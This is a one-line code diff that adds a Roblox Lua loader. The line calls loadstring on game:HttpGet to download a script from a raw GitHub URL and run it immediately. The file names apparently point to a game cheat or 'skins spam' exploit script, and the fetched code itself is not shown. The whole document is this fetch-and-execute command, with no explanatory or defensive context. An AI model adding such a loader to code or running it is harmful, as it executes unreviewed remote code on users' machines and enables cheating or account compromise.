@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/clean-crew-class-skins-spam3-kzc9ykt9jmdu7y.lua"))()
